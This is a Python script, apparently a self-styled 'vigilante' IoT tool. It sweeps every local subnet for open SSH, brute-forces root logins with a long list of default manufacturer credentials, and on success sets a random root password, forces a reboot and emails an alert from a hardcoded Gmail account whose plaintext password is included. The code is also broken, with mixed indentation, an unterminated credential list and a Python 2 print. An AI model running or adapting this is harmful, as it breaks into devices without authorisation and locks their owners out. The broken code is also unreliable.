import time
import netifaces
import sys
import subprocess
import re
import base64
import paramiko
from paramiko.ssh_exception import AuthenticationException, SSHException, BadHostKeyException
import socket
from netaddr import IPNetwork
import random
import string
import smtplib

def genPass():
	# We Change the device password with a 10 Char password
	characters = string.ascii_letters + string.digits + string.punctuation
	return "".join(random.SystemRandom().choice(characters) for x in range(20))

def newPass():
	# This method calls genPass until it produces a password that meets the Linux root password standard of containing at
	# least 1 capital letter
	newPassword = genPass()
	# Keep calling genPass until the resulting password has at least 1 capital letter
	while (not any(x.isupper() for x in newPassword)):
		newPassword = genPass()
	return newPassword

# List containing tuple representations of all default user/pass combinations for IoT possible root/admin accounts.
passwords = ('testuser', 'testuser'),('admin','963258741'),('root','12345'), ('root', 'xc3511'), ('root', 'vizxv'), ('root', 'admin'), ('admin', 'admin'), ('root', '888888'), ('root', 'xmhdipc'), ('root', 'default'), ('root', 'juantech'), ('root', '123456'), ('root', '54321'), ('support', 'support'), ('root', ''), ('admin', 'password'), ('root', 'root'), ('root', '12345'), ('user', 'user'), ('admin', '(none)'), ('root', 'pass'), ('admin', 'admin1234'), ('root', '1111'), ('admin', 'smcadmin'), ('admin', '1111'), ('root', '666666'), ('root', 'password'), ('root', '1234'), ('root', 'klv123'), ('Administrator', 'admin'), ('service', 'service'), ('supervisor', 'supervisor'), ('guest', 'guest'), ('guest', '12345'), ('guest', '12345'), ('admin1', 'password'), ('administrator', '1234'), ('666666', '666666'), ('888888', '888888'), ('ubnt', 'ubnt'), ('root', 'klv1234'), ('root', 'Zte521'), ('root', 'hi3518'), ('root', 'jvbzd'), ('root', 'anko'), ('root', 'zlxx.'), ('root', '7ujMko0vizxv'), ('root', '7ujMko0admin'), ('root', 'system'), ('root', 'ikwb'), ('root', 'dreambox'), ('root', 'user'), ('root', 'realtek'), ('root', '00000000'), ('admin', '1111111'), ('admin', '1234'), ('admin', '12345'), ('admin', '54321'), ('admin', '123456'), ('admin', '7ujMko0admin'), ('admin', '1234'), ('admin', 'pass'), ('admin', 'meinsm'), ('tech', 'tech'), 

def scanRange(interface, address, CIDR):
	# This method scans a specified network range for open SSH and Telnet interfaces (only SSH currently supported for
	# proof of concept then attempts to bruteforce into the roots accounts on all found IPs using
	# the previously defined set of default manufacturer user/pass combinations for root access
	print('[*] IT BEGINS: Starting scan via interface ' + interface)
	print('[*] Checking if any devices have SSH or telnet open')

	vulnerables = []
	
	for ip in IPNetwork(address + '/' + str(CIDR)):
		# Check for SSH port open
		print('[*] Trying IP ' + str(ip) + ' for SSH')
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(2)
		sshResult = sock.connect_ex((str(ip), 22))


		if sshResult == 0:
			# SSH port is open, we now brute
			print('[*] SSH port is open on ' + str(ip))
                        server = smtplib.SMTP('smtp.gmail.com', 587)
			passwordAttempts = 0
			for tuples in passwords:
				passwordAttempts = passwordAttempts + 1
				print('[*] Password attempt ' + str(passwordAttempts) + ' on device ' + str(ip))

				try:
					client = paramiko.SSHClient()
					client.load_system_host_keys()
					client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					client.connect(str(ip), username=tuples[0], password=tuples[1], timeout=2)

					print('[*] Device ' + str(ip) + ' is vulnerable, ALERTING now!')

					print('[*] Changing device password')
					newPassword = newPass()
					client.exec_command('echo "' + str(tuples[0]) + ':' + newPassword + '" | chpasswd')

					print('[*] Forcing device reboot')
					client.exec_command('reboot now')

					vulnerables.append((str(ip), str(newPassword)))
                                        server.starttls()
                                        server.login("faouzikezzi@gmail.com", "20521570")
                                        msg = """Dear System Admins,

                                        There is a vulnerability detected in your device of the ip:""" + str(ip) +"""
                                        Kindly Check and update its credentials immediately.

                                        Thanks,
                                        Invictus automail system,
                                        """
                                        server.sendmail("faouzikezzi@gmail.com", "faouzijedidi1@gmail.com", msg)
                                        print "[*] A notification has been sent to the system Admins"
                                        server.quit()
                                       

					client.close()

					break

				except AuthenticationException:
					continue
				except SSHException as sshException:
					break
				except BadHostKeyException as badHostKeyException:
					break
				except Exception as e:
					break


		else:
			print('[*] Trying IP ' + str(ip) + ' for telnet')

			telnetResult = sock.connect_ex((str(ip), 23))
			if telnetResult == 0:
				print('[*] Telnet was accessible on ' + str(ip))

				# For this example, We have ran this proof of concept for SSH only,
                                # For Telnet will be added,

				NotImplemented

		sock = None

	print('[*] Network scanned!')	
	for newStuff in vulnerables:
		print('Device ' + str(newStuff[0]) + ' password changed to: ' + str(newStuff[1]))

for interface in netifaces.interfaces():
	currentInterface = netifaces.ifaddresses(interface).get(netifaces.AF_INET)

	if currentInterface != None:
		address = currentInterface[0]['addr']

		if address in ['127.0.0.1']:
			continue

		CIDR = 0;
		for piece in currentInterface[0]['netmask'].split('.'):
			binStringCount = "{0:b}".format(int(piece)).count('1')
			CIDR = CIDR + binStringCount

		# If CIDR < /24, are you sure you want to scan a network that big?
		while(1):
			scanRange(interface, address, CIDR)

